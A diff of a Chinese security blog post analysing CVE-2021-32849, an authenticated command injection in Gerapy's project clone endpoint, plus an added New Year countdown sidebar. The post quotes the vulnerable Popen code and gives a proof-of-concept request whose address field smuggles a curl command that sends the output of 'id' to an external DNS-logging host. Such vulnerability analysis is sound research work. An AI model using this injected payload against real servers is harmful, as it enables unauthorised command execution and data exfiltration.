@@ -316,14 +316,14 @@
         <p>@[TOC](Gerapy clone 后台远程命令执行漏洞【CVE-2021-32849】)</p>
 <p>该漏洞的利用需要授权，虽然危害较大，但是感觉还是比较鸡肋的。<br>项目地址：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/Gerapy/Gerapy">Gerapy</a><br>该漏洞出现在项目的<code>gerapy/server/core/views.py</code>中的<code>project_clone</code>函数中：</p>
 <span id="more"></span>
-<p><img src="https://i-blog.csdnimg.cn/blog_migrate/9eb4aefb4396f43fdf3008db2f01d093.png" referrerpolicy="no-referrer" alt="在这里插入图片描述"></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/9eb4aefb4396f43fdf3008db2f01d093.png" referrerpolicy="no-referrer" alt="在这里插入图片描述" referrerpolicy="no-referrer"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@api_view(<span class="params">[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@permission_classes(<span class="params">[IsAuthenticated]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">project_clone</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    clone project from github</span></span><br><span class="line"><span class="string">    :param request: request object</span></span><br><span class="line"><span class="string">    :return: json</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        data = json.loads(request.body)</span><br><span class="line">        address = data.get(<span class="string">&#x27;address&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> address.startswith(<span class="string">&#x27;http&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">        address = address + <span class="string">&#x27;.git&#x27;</span> <span class="keyword">if</span> <span class="keyword">not</span> address.endswith(<span class="string">&#x27;.git&#x27;</span>) <span class="keyword">else</span> address</span><br><span class="line">        cmd = <span class="string">&#x27;git clone &#123;address&#125; &#123;target&#125;&#x27;</span>.<span class="built_in">format</span>(address=address, target=join(PROJECTS_FOLDER, Path(address).stem))</span><br><span class="line">        logger.debug(<span class="string">&#x27;clone cmd %s&#x27;</span>, cmd)</span><br><span class="line">        p = Popen(cmd, shell=<span class="literal">True</span>, stdin=PIPE, stdout=PIPE, stderr=PIPE)</span><br><span class="line">        stdout, stderr = bytes2str(p.stdout.read()), bytes2str(p.stderr.read())</span><br><span class="line">        logger.debug(<span class="string">&#x27;clone run result %s&#x27;</span>, stdout)</span><br><span class="line">        <span class="keyword">if</span> stderr: logger.error(stderr)</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="literal">True</span>&#125;) <span class="keyword">if</span> <span class="keyword">not</span> stderr <span class="keyword">else</span> JsonResponse(&#123;<span class="string">&#x27;status&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>注意到第339行使用了Popen函数，搜一下这个函数的作用：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/799f6635745b9e6dfc81b445ddb3b5f2.png" referrerpolicy="no-referrer" alt="在这里插入图片描述"></p>
-<p>说白了可以用来执行系统命令，我们来验证一下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5d258bd7ccdbd60712f869e1848ed6be.png" referrerpolicy="no-referrer" alt="在这里插入图片描述"><br>成功弹出来了计算器。<br>所以如果cmd参数可控，那么就可以用来执行系统命令，<br>cmd的赋值操作：</p>
+<p>注意到第339行使用了Popen函数，搜一下这个函数的作用：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/799f6635745b9e6dfc81b445ddb3b5f2.png" referrerpolicy="no-referrer" alt="在这里插入图片描述" referrerpolicy="no-referrer"></p>
+<p>说白了可以用来执行系统命令，我们来验证一下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5d258bd7ccdbd60712f869e1848ed6be.png" referrerpolicy="no-referrer" alt="在这里插入图片描述" referrerpolicy="no-referrer"><br>成功弹出来了计算器。<br>所以如果cmd参数可控，那么就可以用来执行系统命令，<br>cmd的赋值操作：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">&#x27;git clone &#123;address&#125; &#123;target&#125;&#x27;</span>.<span class="built_in">format</span>(address=address, target=join(PROJECTS_FOLDER, Path(address).stem))</span><br></pre></td></tr></table></figure>
-<p>address或者target可控就可以执行命令<br>address的赋值操作：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3fc852ebbd311913f9e1987b778fb0d7.png" referrerpolicy="no-referrer" alt="在这里插入图片描述"><br>观察这一串代码，首先将请求体的数据加载为python字典，然后获取其中address键的值赋值给address，同时还要满足address的值以http开头，否则就直接退出程序了。最后将address拼接.git赋值个address。从这个过程可以看到，address的值是我们完全可控的，也就意味着我们可以用来执行系统命令。</p>
+<p>address或者target可控就可以执行命令<br>address的赋值操作：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3fc852ebbd311913f9e1987b778fb0d7.png" referrerpolicy="no-referrer" alt="在这里插入图片描述" referrerpolicy="no-referrer"><br>观察这一串代码，首先将请求体的数据加载为python字典，然后获取其中address键的值赋值给address，同时还要满足address的值以http开头，否则就直接退出程序了。最后将address拼接.git赋值个address。从这个过程可以看到，address的值是我们完全可控的，也就意味着我们可以用来执行系统命令。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /api/project/clone HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">Content-Length: 61</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Authorization: Token 0fb31a60728efd8e6398349bea36fa7629bd8df0</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;address&quot;:&quot;http://127.0.0.1;curl `id`.rwbmny.dnslog.cn&quot;&#125;</span><br></pre></td></tr></table></figure>
-<p>访问的api信息在这儿：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/01e29197029a0735c2b4675d5678692a.png" referrerpolicy="no-referrer" alt="在这里插入图片描述"><br>不幸的是，这个操作需要认证，看到请求头中的Authorization标头了吗，无语凝噎：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e8b49ac4d5289c12a97c47bd7c7b0e98.png" referrerpolicy="no-referrer" alt="在这里插入图片描述"><br>顺着这个思路其实还有一系列的利用链条，有兴趣的可以自行下载源码审计。</p>
+<p>访问的api信息在这儿：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/01e29197029a0735c2b4675d5678692a.png" referrerpolicy="no-referrer" alt="在这里插入图片描述" referrerpolicy="no-referrer"><br>不幸的是，这个操作需要认证，看到请求头中的Authorization标头了吗，无语凝噎：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e8b49ac4d5289c12a97c47bd7c7b0e98.png" referrerpolicy="no-referrer" alt="在这里插入图片描述" referrerpolicy="no-referrer"><br>顺着这个思路其实还有一系列的利用链条，有兴趣的可以自行下载源码审计。</p>
 
     </div>
 
@@ -464,12 +464,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/archives/fe9d893.html" rel="prev" title="Hadoop Yarn RPC 未授权远程代码执行漏洞复现">
-      <i class="fa fa-chevron-left"></i> Hadoop Yarn RPC 未授权远程代码执行漏洞复现
+    <a href="/archives/faaa9881.html" rel="prev" title="Hadoop 任意文件写入【CVE-2022-26612】">
+      <i class="fa fa-chevron-left"></i> Hadoop 任意文件写入【CVE-2022-26612】
     </a></div>
       <div class="post-nav-item">
-    <a href="/archives/38dceb78.html" rel="next" title="Fastjson反序列化漏洞原理分析及复现">
-      Fastjson反序列化漏洞原理分析及复现 <i class="fa fa-chevron-right"></i>
+    <a href="/archives/4187a059.html" rel="next" title="Fastjson反序列化漏洞TemplateImpl利用链条跟踪与分析">
+      Fastjson反序列化漏洞TemplateImpl利用链条跟踪与分析 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -858,6 +858,199 @@ NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
     gitalk.render('gitalk-container');
   }, window.Gitalk);
 });
+</script>
+<style>
+#custom_bar {
+  float: right;
+  font-style: italic;
+  background-color: lightgray;
+  position: fixed;
+  top: 20%;
+  right: 50px;
+  box-shadow: 15px 10px 10px gray;
+}
+/* 新年侧边栏 */
+#newYear {
+  color: white;
+  padding: 0 !important;
+}
+
+#newYear p,
+#newYear h3 {
+  font-weight: normal;
+  color: inherit;
+  margin: 0;
+}
+
+#newYear .item-headline {
+  display: none;
+}
+
+.newYear-slider {
+  position: absolute;
+  left: 0;
+  top: 0;
+  height: 100%;
+  width: 100%;
+}
+
+.newYear-slider .swiper-slide {
+  min-height: 160px;
+  min-width: 210px;
+  background-size: cover;
+  position: absolute;
+  left: 0;
+  top: 0;
+  height: 100%;
+  width: 100%;
+}
+
+#newYear-main {
+  width: 100%;
+  pointer-events: none;
+  padding: 1rem;
+  position: relative;
+  left: 0;
+  top: 0;
+  z-index: 1;
+}
+
+#newYear-main * {
+  position: relative;
+  line-height: 1.3;
+}
+
+#newYear-main .time,
+#newYear-main .happyNewYear {
+  font-size: 3rem;
+  margin: 8px 0;
+  display: block;
+}
+
+#newYear-main .newYear-time {
+  font-weight: bold;
+  text-align: center;
+}
+
+#newYear-main .day {
+  font-size: 4rem;
+  letter-spacing: 6px;
+  margin-right: -6px;
+}
+
+#newYear-main .unit {
+  font-size: 1rem;
+}
+
+#newYear-main .mask {
+  position: absolute;
+  left: 0;
+  top: 0;
+  height: 100%;
+  width: 100%;
+  background-color: rgba(0, 0, 0, .2);
+}
+
+[data-theme=dark] #newYear-main .mask {
+  background-color: rgba(0, 0, 0, .3);
+}
+</style>
+<link data-pjax rel="stylesheet" href="https://lf9-cdn-tos.bytecdntp.com/cdn/expire-1-M/Swiper/8.0.6/swiper-bundle.min.css">
+<aside id="custom_bar">
+    <div id="newYear">
+        <div class="newYear-slider">
+            <div class="swiper-wrapper">
+                <div class="swiper-slide" style="background-image:url(/images/ma1.jpg)"></div>
+                <div class="swiper-slide" style="background-image:url(/images/ma2.jpg)"></div>
+                <div class="swiper-slide" style="background-image:url(/images/ma3.jpg)"></div>
+                <div class="swiper-slide" style="background-image:url(/images/ma4.jpg)"></div>
+            </div>
+        </div>
+        <div id="newYear-main">
+            <div class="mask"></div>
+            <p class="title"></p>
+            <div class="newYear-time"></div>
+            <p class="today" style="text-align: right;"></p>
+        </div>
+    </div>
+</aside>
+<script data-pjax src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/Swiper/8.0.6/swiper-bundle.min.js"></script>
+<script data-pjax>
+    function newYear() {
+    if (!document.querySelector('#newYear')) return;
+    // 新年时间戳 and 星期对象
+    let SpringFestival = new Date('2026-02-17 00:00:00')
+    let newYear = SpringFestival.getTime() / 1000,
+        week = { 0: '周日', 1: '周一', 2: '周二', 3: '周三', 4: '周四', 5: '周五', 6: '周六' }
+    function nol(h) { h = Number(h); return h > 9 ? h : '0' + h; }
+    time();
+
+    function time() {
+        // 现在 时间对象
+        let now = new Date();
+
+        // 右下角 今天
+        document.querySelector('#newYear .today').innerHTML = now.getFullYear() + '-' + (now.getMonth() + 1) + '-' + now.getDate() + ' ' + week[now.getDay()]
+
+        // 现在与新年相差秒数
+        let second = newYear - Math.round(now.getTime() / 1000);
+
+        // 小于0则表示已经过年
+        if (second < 0) {
+        window.newYearTimer = null
+        document.querySelector('#newYear .title').innerHTML = 'Happy New Year!';
+        document.querySelector('#newYear .newYear-time').innerHTML = '<span class="happyNewYear">新年快乐</span>';
+        } else {
+        // 大于0则还未过年
+        document.querySelector('#newYear .title').innerHTML = '距离' + SpringFestival.getFullYear() + '年春节：'
+        // 大于一天则直接渲染天数
+        if (second > 86400) {
+            document.querySelector('#newYear .newYear-time').innerHTML = `<span class="day">${Math.ceil(second / 86400)}</span><span class="unit">天</span>`
+        } else {
+            // 小于一天则使用时分秒计时。
+            let h = nol(parseInt(second / 3600));
+            second %= 3600;
+            let m = nol(parseInt(second / 60));
+            second %= 60;
+            let s = nol(second);
+            document.querySelector('#newYear .newYear-time').innerHTML = `<span class="time">${h}:${m}:${s}</span></span>`;
+            // 计时
+            if (!window.newYearTimer) window.newYearTimer = setInterval(time, 1000);
+        }
+        }
+    }
+    }
+
+    function newYearSwiper() {
+    var swiper = new Swiper('.newYear-slider', {
+        passiveListeners: true,
+        loop: true,
+        // autoplay: false,
+        autoplay: {
+        disableOnInteraction: true,
+        delay: 5000
+        },
+        effect: 'fade',
+        mousewheel: true,
+        autoHeight: true
+    });
+
+    var comtainer = document.querySelector('.newYear-slider');
+    if (comtainer !== null) {
+        comtainer.onmouseenter = () => { swiper.autoplay.stop() };
+        comtainer.onmouseleave = () => { swiper.autoplay.start() };
+    }
+    }
+
+    // 适配了pjax
+    function whenDOMReady() {
+    // pjax加载完成（切换页面）后需要执行的函数和代码
+    newYear()
+    newYearSwiper()
+    }
+
+    whenDOMReady() // 打开网站先执行一次
+    document.addEventListener("pjax:complete", whenDOMReady) // pjax加载完成（切换页面）后再执行一次
 </script>
 
     </div>
